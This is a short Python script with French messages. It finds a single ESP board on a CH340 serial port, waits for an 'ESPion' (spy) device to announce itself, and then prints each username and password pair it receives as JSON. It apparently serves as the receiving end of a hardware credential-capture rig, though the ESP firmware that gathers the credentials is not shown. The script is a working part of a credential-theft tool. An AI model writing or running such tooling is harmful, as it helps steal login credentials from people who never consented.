import serial
import serial.tools.list_ports

selected = None
for port in serial.tools.list_ports.comports():
    if "CH340" in port.description:
        if selected is not None:
            raise Exception(f"Deux ESPs sont connectés, seulement un peut etre connecté. Portes détectées: {selected} {port.name}")
        selected = port.name

if selected == None:
    raise Exception("Aucun ESP est connecté.")

print(f"La porte connectée est la {selected}.")

import json
import requests



def readserial(comport, baudrate, timestamp=False):
    ser = serial.Serial(comport, baudrate, timeout=0.1)         # 1/timeout is the frequency at which the port is read
    while True:
        try:
            data = ser.readline().decode("ascii").strip()
            if data == "STARTED":
                print("ESPion Connecté")
                break
        except:
            pass
    while True:
        try:
            data = ser.readline().decode("ascii").strip()
            if len(data) > 1:
                data = json.loads(data)
                print(f"Reçu les credentielles: {data['username']}:{data['password']}...")
        except:
            pass

if __name__ == '__main__':
    readserial(selected, 115200, True)